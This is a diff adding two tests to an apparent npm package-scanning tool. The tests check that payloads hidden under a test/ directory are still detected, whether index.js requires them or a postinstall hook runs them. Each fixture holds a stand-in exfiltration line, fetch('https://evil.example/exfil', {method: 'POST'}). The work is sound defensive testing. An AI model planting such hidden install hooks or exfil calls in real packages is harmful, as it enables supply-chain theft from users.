@@ -247,6 +247,73 @@ async def test_benign_refactor_produces_no_delta(tmp_path):
 
 
 @pytest.mark.asyncio
+async def test_payload_hidden_in_test_dir_but_required_from_index_is_promoted(tmp_path):
+    """A payload sitting in test/ would ordinarily be excluded from
+    category_set() by path_class alone — but index.js require()'s it, so the
+    reachability pass in backend.deps.references must promote it to SHIPPED
+    and its network capability must show up in the profile."""
+    curr_dir, curr_content = _fetched(tmp_path, "curr", "package")
+    _write(curr_content, "package.json", json.dumps({"name": "reach-pkg", "version": "1.0.0"}))
+    _write(curr_content, "index.js", "require('./test/payload');\nmodule.exports = {};\n")
+    _write(
+        curr_content,
+        "test/payload.js",
+        "fetch('https://evil.example/exfil', {method: 'POST'});\nmodule.exports = {};\n",
+    )
+
+    profile = await _scan(curr_dir, "reach-pkg", "1.0.0")
+
+    from backend.models.enums import CapabilityCategory, PathClass
+
+    assert CapabilityCategory.NETWORK in profile.category_set()
+    payload_evidence = [
+        e for e in profile.evidence if e.file.replace("\\", "/").endswith("test/payload.js")
+    ]
+    assert payload_evidence, "expected evidence from test/payload.js"
+    assert all(e.path_class == PathClass.SHIPPED for e in payload_evidence)
+    assert all(e.reclassified_from == PathClass.TEST for e in payload_evidence)
+
+
+@pytest.mark.asyncio
+async def test_install_hook_target_under_test_dir_is_forced_shipped(tmp_path):
+    """A postinstall hook that runs a file sitting under test/ must still
+    have that file's evidence counted — path-classified TEST would otherwise
+    hide it from category_set() even though it demonstrably executes on
+    `npm install`."""
+    curr_dir, curr_content = _fetched(tmp_path, "curr", "package")
+    _write(
+        curr_content,
+        "package.json",
+        json.dumps(
+            {
+                "name": "hook-pkg",
+                "version": "1.0.0",
+                "scripts": {"postinstall": "node test/install.js"},
+            }
+        ),
+    )
+    _write(curr_content, "index.js", "module.exports = {};")
+    _write(
+        curr_content,
+        "test/install.js",
+        "fetch('https://evil.example/exfil', {method: 'POST'});\n",
+    )
+
+    profile = await _scan(curr_dir, "hook-pkg", "1.0.0")
+
+    from backend.models.enums import CapabilityCategory, PathClass
+
+    assert CapabilityCategory.NETWORK in profile.category_set()
+    hook_evidence = [
+        e for e in profile.evidence if e.file.replace("\\", "/").endswith("test/install.js")
+    ]
+    assert hook_evidence
+    assert all(e.path_class == PathClass.SHIPPED for e in hook_evidence)
+    assert all(e.install_time for e in hook_evidence)
+    assert all(e.reclassified_from == PathClass.TEST for e in hook_evidence)
+
+
+@pytest.mark.asyncio
 async def test_benign_ts_build_produces_no_drift_signal(tmp_path):
     """Negative control: the tarball is nothing but compiled dist/ output with
     a proper source map back to the GitHub source — zero drift signal."""
